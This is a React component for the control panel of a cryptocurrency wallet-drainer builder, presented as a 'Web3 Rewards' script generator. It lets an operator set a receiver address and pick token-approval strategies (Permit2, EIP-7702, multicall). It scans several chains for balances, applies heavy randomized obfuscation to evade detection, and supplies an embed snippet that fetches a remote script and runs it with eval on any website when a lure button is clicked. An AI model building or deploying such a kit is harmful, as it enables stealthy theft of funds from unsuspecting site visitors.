"use client";

import { useState } from "react";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { useStore } from "@/lib/store";
import { generateWeb3RewardsScript } from "@/lib/web3-rewards-script-generator";
import type { Web3RewardsConfig } from "@/lib/web3-rewards-script-generator";
import { Copy, Download, RefreshCw, Zap } from "lucide-react";

export function Web3RewardsTab() {
  const { generalConfig } = useStore();
  const [receiverAddress, setReceiverAddress] = useState("");
  const [buttonSelector, setButtonSelector] = useState("#claim-button");
  const [strategy, setStrategy] = useState<"permit2" | "direct" | "eip7702" | "multicall">("permit2");
  const [chains, setChains] = useState<number[]>([1, 137, 42161]);
  const [obfuscationLevel, setObfuscationLevel] = useState<"minify" | "medium" | "heavy">("heavy");
  const [isGenerating, setIsGenerating] = useState(false);
  const [generatedScript, setGeneratedScript] = useState<string>("");
  const [scriptSize, setScriptSize] = useState(0);
  const [backendUrl, setBackendUrl] = useState(generalConfig?.backendUrl || "https://api.example.com/api/compile/drainer");

  async function generateScript() {
    setIsGenerating(true);
    try {
      const config: Web3RewardsConfig = {
        receiverAddress,
        buttonSelector,
        strategy,
        backendUrl,
        chains,
        obfuscation: obfuscationLevel,
      };

      const script = await generateWeb3RewardsScript(config);
      setGeneratedScript(script);
      setScriptSize(script.length);
    } catch (error) {
      console.error("Failed to generate script:", error);
    } finally {
      setIsGenerating(false);
    }
  }

  function copyToClipboard() {
    navigator.clipboard.writeText(generatedScript);
  }

  function downloadScript() {
    const element = document.createElement("a");
    element.setAttribute("href", `data:text/javascript;charset=utf-8,${encodeURIComponent(generatedScript)}`);
    element.setAttribute("download", `web3-rewards-${Date.now()}.js`);
    element.style.display = "none";
    document.body.appendChild(element);
    element.click();
    document.body.removeChild(element);
  }

  function toggleChain(chainId: number) {
    setChains(chains.includes(chainId) ? chains.filter(c => c !== chainId) : [...chains, chainId]);
  }

  const CHAINS = [
    { id: 1, name: "Ethereum" },
    { id: 56, name: "BSC" },
    { id: 137, name: "Polygon" },
    { id: 42161, name: "Arbitrum" },
    { id: 10, name: "Optimism" },
    { id: 8453, name: "Base" },
  ];

  return (
    <div className="space-y-6">
      <Card className="border-border/40 bg-black/40 backdrop-blur-xl">
        <CardHeader>
          <CardTitle className="flex items-center gap-2">
            <Zap className="h-5 w-5 text-amber-500" />
            Web3 Rewards Standalone Script
          </CardTitle>
          <CardDescription>
            Generate a single embeddable .js file with ALL contracts included. Button selector configurable. Works on ANY website.
          </CardDescription>
        </CardHeader>
        <CardContent className="space-y-6">
          <Tabs defaultValue="config" className="space-y-4">
            <TabsList className="grid w-full grid-cols-3">
              <TabsTrigger value="config">Configuration</TabsTrigger>
              <TabsTrigger value="chains">Networks</TabsTrigger>
              <TabsTrigger value="output">Generated Script</TabsTrigger>
            </TabsList>

            <TabsContent value="config" className="space-y-4">
              <div className="space-y-2">
                <Label htmlFor="receiver">Receiver Address</Label>
                <Input
                  id="receiver"
                  placeholder="0x..."
                  value={receiverAddress}
                  onChange={(e) => setReceiverAddress(e.target.value)}
                  className="font-mono text-xs"
                />
              </div>

              <div className="space-y-2">
                <Label htmlFor="selector">Button Selector (CSS)</Label>
                <Input
                  id="selector"
                  placeholder="#claim-button, .buy-now, button.reward, etc."
                  value={buttonSelector}
                  onChange={(e) => setButtonSelector(e.target.value)}
                />
                <p className="text-xs text-muted-foreground">
                  Any CSS selector that matches the target button on your website
                </p>
              </div>

              <div className="space-y-2">
                <Label htmlFor="strategy">Execution Strategy</Label>
                <Select value={strategy} onValueChange={(v) => setStrategy(v as typeof strategy)}>
                  <SelectTrigger id="strategy">
                    <SelectValue />
                  </SelectTrigger>
                  <SelectContent>
                    <SelectItem value="permit2">Permit2 (Recommended)</SelectItem>
                    <SelectItem value="direct">Direct Transfer</SelectItem>
                    <SelectItem value="eip7702">EIP-7702</SelectItem>
                    <SelectItem value="multicall">Multicall</SelectItem>
                  </SelectContent>
                </Select>
                <p className="text-xs text-muted-foreground">
                  Execution strategy used when backend approves the flow
                </p>
              </div>

              <div className="space-y-2">
                <Label htmlFor="backend">Backend URL</Label>
                <Input
                  id="backend"
                  placeholder="https://your-vps.com/api/compile/drainer"
                  value={backendUrl}
                  onChange={(e) => setBackendUrl(e.target.value)}
                  className="font-mono text-xs"
                />
              </div>

              <div className="space-y-2">
                <Label htmlFor="obfuscation">Obfuscation Level</Label>
                <Select value={obfuscationLevel} onValueChange={(v) => setObfuscationLevel(v as typeof obfuscationLevel)}>
                  <SelectTrigger id="obfuscation">
                    <SelectValue />
                  </SelectTrigger>
                  <SelectContent>
                    <SelectItem value="minify">Minify Only (Simple)</SelectItem>
                    <SelectItem value="medium">Medium (String Shuffling)</SelectItem>
                    <SelectItem value="heavy">Heavy (Control Flow + RC4)</SelectItem>
                  </SelectContent>
                </Select>
                <p className="text-xs text-muted-foreground">
                  Heavy level generates DIFFERENT .js each compile with randomized obfuscation
                </p>
              </div>

              <Button onClick={() => void generateScript()} disabled={isGenerating} className="w-full gap-2">
                <RefreshCw className="h-4 w-4" />
                {isGenerating ? "Generating..." : "Generate Script"}
              </Button>
            </TabsContent>

            <TabsContent value="chains" className="space-y-4">
              <p className="text-sm text-muted-foreground">Select which networks to scan for balances:</p>
              <div className="grid grid-cols-2 gap-3">
                {CHAINS.map((chain) => (
                  <Button
                    key={chain.id}
                    variant={chains.includes(chain.id) ? "default" : "outline"}
                    onClick={() => toggleChain(chain.id)}
                    className="text-xs"
                  >
                    {chain.name} ({chain.id})
                  </Button>
                ))}
              </div>
              <p className="text-xs text-muted-foreground mt-2">
                Selected: {chains.join(", ")}
              </p>
            </TabsContent>

            <TabsContent value="output" className="space-y-4">
              {generatedScript ? (
                <>
                  <div className="flex items-center justify-between">
                    <div className="space-y-1">
                      <p className="text-sm font-medium">Generated Script</p>
                      <p className="text-xs text-muted-foreground">{scriptSize} bytes</p>
                    </div>
                    <div className="flex gap-2">
                      <Button onClick={copyToClipboard} variant="outline" size="sm" className="gap-2">
                        <Copy className="h-3.5 w-3.5" />
                        Copy
                      </Button>
                      <Button onClick={downloadScript} variant="outline" size="sm" className="gap-2">
                        <Download className="h-3.5 w-3.5" />
                        Download
                      </Button>
                    </div>
                  </div>

                  <div className="bg-black/50 border border-border/40 rounded-lg p-4 font-mono text-xs overflow-auto max-h-96">
                    <pre className="text-muted-foreground">{generatedScript.slice(0, 500)}...</pre>
                  </div>

                  <Card className="bg-emerald-500/10 border-emerald-500/20">
                    <CardContent className="pt-6 space-y-2">
                      <p className="text-sm font-medium text-emerald-400">Embed on Any Website</p>
                      <pre className="text-xs bg-black/50 p-3 rounded border border-border/40 overflow-auto">
{`<script>
  fetch('https://cdn.example.com/web3-rewards.js')
    .then(r => r.text())
    .then(script => eval(script));
</script>`}
                      </pre>
                      <p className="text-xs text-muted-foreground">
                        Or host the .js file on your CDN and load it directly. The script listens for clicks on your button selector and handles the rest!
                      </p>
                    </CardContent>
                  </Card>
                </>
              ) : (
                <p className="text-sm text-muted-foreground text-center py-8">
                  Configure and generate a script to see the output
                </p>
              )}
            </TabsContent>
          </Tabs>
        </CardContent>
      </Card>
    </div>
  );
}
